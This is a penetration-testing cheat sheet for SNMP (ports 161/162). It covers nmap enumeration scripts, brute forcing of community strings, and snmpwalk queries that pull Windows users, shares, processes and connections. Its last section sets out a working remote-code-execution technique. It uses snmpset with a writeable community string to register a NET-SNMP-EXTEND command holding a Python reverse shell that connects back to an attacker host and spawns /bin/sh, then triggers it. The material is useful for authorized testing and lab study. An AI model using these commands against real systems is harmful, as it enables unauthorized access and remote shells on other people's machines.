# 161, 162, 10161, 10162 - SNMP

`161/udp open snmp`

## Enumeration

### SNMP Nmap Scripts

#SNMP #UDP #Enumeration
Run SNMP Nmap scripts.

```sh
sudo nmap -sU -p 161 --script snmp-* <TARGET_IP> -oN enum/nmap/snmp.txt
```

### SNMP Community Bruteforce With Nmap

#SNMP #UDP #Enumeration
Bruteforce community strings with Nmap.

```sh
nmap -sU -p 161 --script snmp-brute <TARGET_IP> --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

### SNMP Check With Known Community

#SNMP #UDP #Enumeration
Enumerate SNMP with a known community string. Default is often `public`.

```sh
snmp-check -c <COMMUNITY> <TARGET_IP>
```

### SNMP Bulk Tree Collection

#SNMP #UDP #Enumeration
Collect the SNMP tree with a known community string. Default is often `public`.

```sh
snmpbulkwalk -c <COMMUNITY> -v2c <TARGET_IP> . | tee enum/bulk-snmp
grep -oP '::.*?\.' enum/bulk-snmp | sort | uniq -c | sort -n
grep hrSWRun enum/bulk-snmp | less
```

### Detailed SNMP Walks

### Detailed SNMP Walks - Windows

#SNMP #UDP #Enumeration #Windows
Example 1 - Windows host data.

```sh
# System info, hostname, OS, contact, and location.
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.1

# Processes and process arguments.
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> HOST-RESOURCES-MIB::hrSWRunParameters

# Installed software, interfaces, and TCP connections.
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.2.2
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.6.13.1.3

# Windows users, shares, services, and domain/workgroup.
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> LANMAN-MIB::lmUserAdminName
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> LANMAN-MIB::lmShareName
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> LANMAN-MIB::lmSvcName
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> LANMAN-MIB::lmDomainName
```

## SNMP Extend Shell

#Shell #SNMP #UDP #Exploitation
Prepare tooling, create an SNMP extend reverse shell command, and trigger it.

```sh
# Attacker: prepare snmp-shell locally.
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt

# Attacker: create an SNMP extend reverse shell command using a writeable community string.
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <COMMUNITY> <TARGET_IP> 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'

# Attacker: trigger the SNMP extend command with the same writeable community string.
snmpwalk -v 2c -c <COMMUNITY> <TARGET_IP> nsExtendObjects
```
